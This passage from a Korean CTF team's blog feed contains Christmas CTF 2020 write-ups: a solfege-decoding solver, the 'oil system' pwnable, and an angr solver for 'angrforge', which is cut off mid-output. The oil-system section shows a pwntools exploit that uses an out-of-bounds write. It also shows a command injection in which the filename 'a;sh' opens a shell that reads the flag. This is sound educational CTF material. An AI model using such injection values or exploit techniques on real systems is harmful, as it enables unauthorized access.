class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>]idx = [<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]flag = []pre_chk = <span class="hljs-number">0</span><span class="hljs-keyword">while</span>(len(flag) &lt; len(idx)):cur_chk = idx[len(flag)]buf = note[pre_chk:pre_chk+cur_chk]result = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(buf)): <span class="hljs-keyword">if</span>(buf[i] == <span class="hljs-string">&apos;la&apos;</span>): result += <span class="hljs-number">0xa</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&apos;ti&apos;</span>): result += <span class="hljs-number">0xb</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&apos;do&apos;</span>): result += <span class="hljs-number">0xc</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&apos;re&apos;</span>): result += <span class="hljs-number">0xd</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&apos;mi&apos;</span>): result += <span class="hljs-number">0xe</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&apos;fa&apos;</span>): result += <span class="hljs-number">0xf</span>flag.append(chr(result))print(<span class="hljs-string">&apos;&apos;</span>.join(flag))pre_chk += cur_chk</code></pre><pre><code class="hljs plain">XXMXMAXMASXMAS{XMAS{7XMAS{7hXMAS{7heXMAS{7herXMAS{7her3XMAS{7her3_XMAS{7her3_iXMAS{7her3_i5XMAS{7her3_i5_XMAS{7her3_i5_nXMAS{7her3_i5_noXMAS{7her3_i5_no_XMAS{7her3_i5_no_GXMAS{7her3_i5_no_G_XMAS{7her3_i5_no_G_iXMAS{7her3_i5_no_G_inXMAS{7her3_i5_no_G_in_XMAS{7her3_i5_no_G_in_HXMAS{7her3_i5_no_G_in_H3XMAS{7her3_i5_no_G_in_H3XXMAS{7her3_i5_no_G_in_H3X}</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>misc</tag>
      
      <tag>scale</tag>
      
      <tag>hex</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - oil system</title>
    <link href="/2020/12/29/fabu1ous/oil-system/"/>
    <url>/2020/12/29/fabu1ous/oil-system/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBA38;&#xB9BF;&#xB9D0;"><a href="#&#xBA38;&#xB9BF;&#xB9D0;" class="headerlink" title="&#xBA38;&#xB9BF;&#xB9D0;"></a>&#xBA38;&#xB9BF;&#xB9D0;</h1><p>CVE-2020&#x2013;15647&#xB294; Firefox Fennec v68.9.0&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Arbitrary local file access&#xC785;&#xB2C8;&#xB2E4;. &#xD30C;&#xC77C;&#xC744; Cache &#xD560; &#xB54C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC744; &#xD574;&#xC26C; &#xD574;&#xC57C; &#xD558;&#xC9C0;&#xB9CC; Firefox Fennec v68.9.0&#xC758; <code>content:// URI</code> &#xB85C;&#xC9C1;&#xC5D4; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Arbitrary local file access&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC0C1;&#xD669;&#xC744; pwnable &#xBB38;&#xC81C;&#xB85C; &#xAD6C;&#xD604;&#xD574;&#xBD24;&#xB294;&#xB370;&#x2026;</p><p><img src="/2020/12/29/fabu1ous/oil-system/1.png" alt></p><p>unintended solution&#xC73C;&#xB85C; &#xCEE4;&#xBA58;&#xB4DC; &#xC778;&#xC81D;&#xC158;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC0C1;&#xC704;&#xAD8C; &#xC194;&#xBE0C;&#xAC00; &#xBAA8;&#xB450; &#xCEE4;&#xBA58;&#xB4DC; &#xC778;&#xC81D;&#xC158;&#xC774;&#xB354;&#xAD70;&#xC694;&#x2026; &#xD558;&#xD558;&#xD558;. &#xBB38;&#xC81C; &#xAC80;&#xC218; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xCEE4;&#xBA58;&#xB4DC; &#xC778;&#xC81D;&#xC158;&#xC5D0; &#xB300;&#xD55C; &#xB9D0;&#xC774; &#xB098;&#xC640;&#xC11C; &#xC218;&#xC815;&#xD558;&#xACE0; &#xAC80;&#xC99D;&#xAE4C;&#xC9C0; &#xD588;&#xB294;&#xB370; &#xC218;&#xC815; &#xC548;&#xB41C; &#xBC84;&#xC804;&#xC774; &#xB300;&#xD68C; &#xB54C; &#xC62C;&#xB77C;&#xAC14;&#xB124;&#xC694;.</p><p>oil-system &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xC8FC;&#xC2E0; &#xBD84;&#xB4E4;&#xAED8; &#xC815;&#xB9D0; &#xC8C4;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xC870;&#xAE08; &#xB354; &#xCCA0;&#xC800;&#xD558;&#xAC8C; &#xC900;&#xBE44;&#xD588;&#xC5B4;&#xC57C; &#xB410;&#xB294;&#xB370;&#x2026;</p><h1 id="&#xD480;&#xC774;-&#xC694;&#xC57D;"><a href="#&#xD480;&#xC774;-&#xC694;&#xC57D;" class="headerlink" title="&#xD480;&#xC774; &#xC694;&#xC57D;"></a>&#xD480;&#xC774; &#xC694;&#xC57D;</h1><p><img src="/2020/12/29/fabu1ous/oil-system/2.png" alt></p><p><img src="/2020/12/29/fabu1ous/oil-system/3.png" alt></p><p>&#xBB38;&#xC81C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; subleq&#xC774;&#xB77C;&#xB294; One-Instruction-Language system &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xC785;&#xB2C8;&#xB2E4;. subleq &#xCF54;&#xB4DC;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC5B4;&#xC640; &#xC2A4;&#xD0DD;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xADF8; &#xCF54;&#xB4DC;&#xB97C; &#xD574;&#xC11D;&#xD574; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. subleq&#xCF54;&#xB4DC;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xB294; &#xD568;&#xC218;&#xC5D0; OOB &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD574; &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. subleq &#xCF54;&#xB4DC;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; cache &#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xB3C4; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xB370; &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;&#xB9CC; &#xBC14;&#xB014; &#xBFD0; &#xD30C;&#xC77C;&#xBA85;&#xC744; &#xC720;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. Write Code &#xAE30;&#xB2A5;&#xC73C;&#xB85C; flag&#xB77C;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xACE0; &#xC2E4;&#xC81C; flag&#xD30C;&#xC77C;&#xC774; cache &#xB418;&#xB3C4;&#xB85D; &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xC720;&#xB3C4;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="&#xCDE8;&#xC57D;&#xC810;"><a href="#&#xCDE8;&#xC57D;&#xC810;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810;"></a>&#xCDE8;&#xC57D;&#xC810;</h1><ul><li>OOB</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/4.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xC740; &#xD568;&#xC218; subleq()&#xC758; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. a2&#xC758; index&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; v4&#xC640; v5&#xC758; &#xCD5C;&#xB313;&#xAC12;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; oob write&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. v4&#xC640; v5&#xAC12;&#xB97C; &#xC774;&#xC6A9;&#xD574; a2&#xBCF4;&#xB2E4; &#xB192;&#xC740; &#xC8FC;&#xC18C;&#xC5D0; &#xC788;&#xB294; &#xC2A4;&#xD0DD; &#xC5B4;&#xB514;&#xB4E0; &#xCC38;&#xC870;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xACE0; &#xB9AC;&#xD134; &#xAC12;&#xC744; &#xC624;&#xC5FC;&#xC2DC;&#xD0AC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = remote(<span class="hljs-string">&apos;localhost&apos;</span>, <span class="hljs-number">1234</span>)<span class="hljs-comment"># Write Code</span>p.sendlineafter(<span class="hljs-string">&apos;&gt; &apos;</span>, <span class="hljs-string">&apos;2&apos;</span>)p.sendafter(<span class="hljs-string">&apos;Enter your Program\&apos;s Name : &apos;</span>, <span class="hljs-string">&apos;flag&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;Enter Code : &apos;</span>,<span class="hljs-string">&apos;4 166 -1 -1 -1054&apos;</span>)<span class="hljs-comment"># Run Code</span>p.sendlineafter(<span class="hljs-string">&apos;&gt; &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)<span class="hljs-comment"># Get flag with View Cached code</span>p.sendlineafter(<span class="hljs-string">&apos;&gt; &apos;</span>, <span class="hljs-string">&apos;4&apos;</span>)p.interactive()</code></pre><pre><code class="hljs routeros">[+] Opening<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> localhost on<span class="hljs-built_in"> port </span>1234: Done[*] Switching <span class="hljs-keyword">to</span> interactive modeXMAS{U5e_Ma11oc_Nex7_tim3_Mr_Kim} ========[ Menu ]======== 1. Read test description 2. Write Code 3. <span class="hljs-builtin-name">Run</span> Code 4. View Cached code &gt; TIMEOUT[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive</code></pre><h1 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h1><ul><li>unintended solution</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/5.png" alt></p><p>&#xD30C;&#xC77C;&#xBA85; &#xD544;&#xD130; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xD30C;&#xC77C;&#xBA85;&#xC5D0; &#xC601;&#xBB38; &#xC18C;&#xBB38;&#xC790; &#xC774;&#xC678;&#xC758; &#xC785;&#xB825;&#xC774; &#xB4E4;&#xC5B4;&#xC628;&#xB2E4;&#xBA74; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC885;&#xB8CC;&#xD569;&#xB2C8;&#xB2E4;. &#xC548;&#xD0C0;&#xAE5D;&#xAC8C;&#xB3C4; &#xC720;&#xC2EC;&#xD788; &#xBCF4;&#xC2DC;&#xBA74; &#xCCAB; &#xAE00;&#xC790;&#xB9CC; &#xAC80;&#xC0AC;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <s>&#xBB38;&#xC81C; &#xB9CC;&#xB4E0; &#xB188;&#xC774; &#xD535;&#xC2E0;&#xC778;&#xB4EF;</s></p><pre><code class="hljs plain"> ========[ Menu ]======== 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 2 Enter your Program&apos;s Name : a;sh Enter Code : your an idiot ========[ Menu ]======== 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 3 Error while fopen$ cat flagXMAS{U5e_Ma11oc_Nex7_tim3_Mr_Kim}$</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>oob</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - angrforge</title>
    <link href="/2020/12/29/idioth/christmasctf2020-angrforge/"/>
    <url>/2020/12/29/idioth/christmasctf2020-angrforge/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xCD9C;&#xC81C;-&#xC758;&#xB3C4;"><a href="#&#xCD9C;&#xC81C;-&#xC758;&#xB3C4;" class="headerlink" title="&#xCD9C;&#xC81C; &#xC758;&#xB3C4;"></a>&#xCD9C;&#xC81C; &#xC758;&#xB3C4;</h1><p>angr&#xB97C; &#xD1B5;&#xD574; &#xC785;&#xB825; &#xAC12;&#xC744; &#xBF51;&#xC544;&#xB0B4;&#xB294; &#xAC83;&#xC774; &#xC758;&#xB3C4;&#xC778; &#xBB38;&#xC81C;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xB294; &#xC5EC;&#xB7EC; &#xBC88;&#xC758; &#xC218;&#xC815;&#xC744; &#xAC70;&#xCCE4;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6D0;&#xB798; &#xC774; &#xBB38;&#xC81C;&#xB3C4; arm &#xD658;&#xACBD;&#xC5D0;&#xC11C; angr&#xB97C; &#xB3CC;&#xB9AC;&#xB294; &#xBB38;&#xC81C;&#xB85C; &#xB0BC; &#xC608;&#xC815;&#xC774;&#xC5C8;&#xB294;&#xB370; arm&#xC5D0;&#xC11C; &#xC81C;&#xB300;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xC9C0; &#xC54A;&#xC544;&#xC11C; arm&#xC740; &#xD3EC;&#xAE30;. &#xADF8;&#xB9AC;&#xACE0; &#xC6D0;&#xB798; &#xCC98;&#xC74C;&#xC5D0;&#xB294; c++&#xB85C; &#xB0C8;&#xC5C8;&#xB294;&#xB370; &#xAC80;&#xC218; &#xD6C4; &#xC218;&#xC815;&#xC744; &#xD588;&#xB354;&#xB2C8; simulation manager&#xB97C; &#xB3CC;&#xB824;&#xB3C4; &#xAC12;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xB098;&#xC624;&#xC9C0; &#xC54A;&#xC544;&#xC11C; c&#xB85C; &#xC62E;&#xAE30;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC5F0;&#xC0B0; &#xBA87; &#xAC1C;&#xB97C; &#xBE90;&#xC2B5;&#xB2C8;&#xB2E4;..&#x3160;</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ file angrforge<span class="hljs-attribute">angrforge</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked,<span class="hljs-attribute">interpreter</span> /lib<span class="hljs-number">64</span>/ld-linux-x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>,<span class="hljs-attribute">BuildID</span>[sha<span class="hljs-number">1</span>]=<span class="hljs-number">1162</span>ed<span class="hljs-number">229</span>a<span class="hljs-number">12133</span>d<span class="hljs-number">07</span>de<span class="hljs-number">26301</span>dad<span class="hljs-number">1</span>ada<span class="hljs-number">34</span>a<span class="hljs-number">9</span>c<span class="hljs-number">3</span>ff, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, stripped</code></pre><p>64bit ELF &#xD30C;&#xC77C;&#xC774;&#xBA70;, stripped &#xB418;&#xC5B4;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_00103be1</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  undefined8 local_58;  undefined8 local_50;  undefined8 local_48;  undefined8 local_40;  undefined8 local_38;  undefined8 local_30;  undefined8 local_28;  undefined local_20;  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  local_58 = <span class="hljs-number">0</span>;  local_50 = <span class="hljs-number">0</span>;  local_48 = <span class="hljs-number">0</span>;  local_40 = <span class="hljs-number">0</span>;  local_38 = <span class="hljs-number">0</span>;  local_30 = <span class="hljs-number">0</span>;  local_28 = <span class="hljs-number">0</span>;  local_20 = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;General Angerforge, the Dark Iron responsible for stealing my computer.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But I\&apos;m just a programmer.. so Call me my best warrior friend.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you call my friend, I will give you a good reward.&quot;</span>);  fgets((<span class="hljs-keyword">char</span> *)&amp;local_58,<span class="hljs-number">0x39</span>,<span class="hljs-built_in">stdin</span>);  FUN_00103a48(&amp;local_58);  iVar1 = FUN_001039f7(&amp;local_58);  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) {    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OMG, Thank you for your good works :)&quot;</span>);  }  <span class="hljs-keyword">else</span> {    FUN_001039d9();  }  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) {                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>    __stack_chk_fail();  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>ghidra&#xB97C; &#xD1B5;&#xD574; &#xB514;&#xCEF4;&#xD30C;&#xC77C;&#xC744; &#xD55C; &#xD6C4; main&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;, <code>0x39(57)</code>&#xB9CC;&#xD07C;&#xC758; &#xC785;&#xB825; &#xAC12;&#xC744; &#xBC1B;&#xC544;&#xC11C; <code>FUN_00103a48</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xACE0;, <code>FUN_001039f7</code>&#xC744; &#xD1B5;&#xD574; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCCB4;&#xD06C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00103a48</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">size_t</span> sVar1;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  <span class="hljs-keyword">if</span> (sVar1 &lt; (ulong)(<span class="hljs-keyword">long</span>)(<span class="hljs-keyword">int</span>)((DAT_00106014 | DAT_00106010) + <span class="hljs-number">5</span>)) {    FUN_001033e9(param_1);    FUN_00103481(param_1);    FUN_00103519(param_1);    FUN_001035b1(param_1);    FUN_00103649(param_1);    FUN_001036e1(param_1);    FUN_00103779(param_1);    FUN_00103811(param_1);    FUN_001038a9(param_1);    FUN_00103941(param_1);  }  <span class="hljs-keyword">else</span> {    FUN_001011c9(param_1);    FUN_00101396(param_1);    FUN_00101563(param_1);    FUN_00101730(param_1);    FUN_001018fd(param_1);    FUN_00101abf(param_1);    FUN_00101bbf(param_1);    FUN_00101cce(param_1);    FUN_00101dce(param_1);    FUN_00101eee(param_1);    FUN_001022cb(param_1);    FUN_00102589(param_1);    FUN_00102847(param_1);    FUN_00102b05(param_1);    FUN_00102dc3(param_1);    FUN_00102ef9(param_1);    FUN_00103035(param_1);    FUN_00103171(param_1);    FUN_001032ad(param_1);  }  <span class="hljs-keyword">return</span>;}</code></pre><p><code>FUN_00103a48</code> &#xD568;&#xC218;&#xB294; &#xC785;&#xB825; &#xAC12;&#xC744; &#xBC1B;&#xC544;&#xC11C;, &#xAE38;&#xC774;&#xC5D0; &#xB530;&#xB77C;&#xC11C; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xB2E4;&#xB978; sub &#xD568;&#xC218;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xAC01; sub &#xD568;&#xC218;&#xC758; &#xC5F0;&#xC0B0;&#xC740; &#xC11C;&#xB85C; &#xB2E4;&#xB978; &#xBC14;&#xC774;&#xD2B8;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xC9C0; &#xC54A;&#xACE0; &#xD568;&#xC218;&#xAC00; &#xB2E4;&#xB978; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xB3C4; &#xC788;&#xC5B4;&#xC11C; &#xC0C1;&#xB2F9;&#xD788; &#xBCF5;&#xC7A1;&#xD558;&#xAC8C; &#xC5BD;&#xD600;&#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. c++&#xC5D0;&#xB294; &#xACF1; &#xC5F0;&#xC0B0; &#xAC19;&#xC740; &#xAC83;&#xB3C4; &#xB123;&#xC5C8;&#xB294;&#xB370; c&#xB85C; &#xAE09;&#xD558;&#xAC8C; &#xC62E;&#xAE30;&#xBA74;&#xC11C; &#xBCF4;&#xB2C8; &#xBC14;&#xC774;&#xD2B8;&#xAC00; &#xC99D;&#xBC1C;&#xD558;&#xB354;&#xAD70;&#xC694;..&#x3160; <del>&#xC2DC;&#xAC04; &#xBD80;&#xC871;&#xC73C;&#xB85C; &#xC778;&#xD55C; &#xC5ED; &#xC5F0;&#xC0B0; &#xAC00;&#xB2A5; &#xB85C;&#xC9C1;</del></p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_001039f7</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> local_c;    local_c = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) {    <span class="hljs-keyword">if</span> (<span class="hljs-number">0x37</span> &lt; local_c) {      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    }    <span class="hljs-keyword">if</span> (*(<span class="hljs-keyword">char</span> *)(param_1 + local_c) != (&amp;DAT_00104080)[local_c]) <span class="hljs-keyword">break</span>;    local_c = local_c + <span class="hljs-number">1</span>;  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p><code>FUN_001039f7</code>&#xC5D0;&#xC11C;&#xB294; 0x38&#xB9CC;&#xD07C; <code>DAT_00104080</code>&#xACFC; &#xAC12;&#xC744; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xB9DE;&#xC73C;&#xBA74; <code>1</code>, &#xC544;&#xB2D0; &#xC2DC; <code>0</code>&#xC744; &#xB9AC;&#xD134;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><code>\n</code>&#xC744; &#xC81C;&#xC678;&#xD55C; &#xBB38;&#xC790;&#xC5F4;&#xC758; &#xAE38;&#xC774;&#xB294; 56&#xC774;&#xACE0;, <code>stdin</code>&#xC744; &#xD1B5;&#xD574; &#xC785;&#xB825; &#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xAC00;&#xBBC0;&#xB85C; &#xC785;&#xB825; &#xAC12; 56&#xACFC; <code>stdin</code>&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; state&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xC5EC; simulation manager&#xB97C; &#xB3CC;&#xB9AC;&#xBA74; &#xAC12;&#xC744; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripyp = angr.Project(<span class="hljs-string">&apos;./angrforge&apos;</span>)flag_chars = [claripy.BVS(<span class="hljs-string">&apos;flag_%d&apos;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">56</span>)]flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="hljs-string">b&apos;\n&apos;</span>)])st = p.factory.full_init_state(    stdin = flag,    add_options = angr.options.unicorn,)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_chars:    st.solver.add(i != <span class="hljs-number">0</span>)    st.solver.add(i != <span class="hljs-number">10</span>)sm = p.factory.simulation_manager(st)sm.run()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sm.deadended:    <span class="hljs-keyword">if</span> <span class="hljs-string">b&apos;OMG&apos;</span> <span class="hljs-keyword">in</span> i.posix.dumps(<span class="hljs-number">1</span>):        print(i.posix.dumps(<span class="hljs-number">0</span>))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ python<span class="hljs-number">3</span> solve.py<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">44</span>,<span class="hljs-number">086</span> | cle.loader | The main binary is a position-independent executable.<span class="hljs-attribute">It</span> is being loaded with a base address of <span class="hljs-number">0</span>x<span 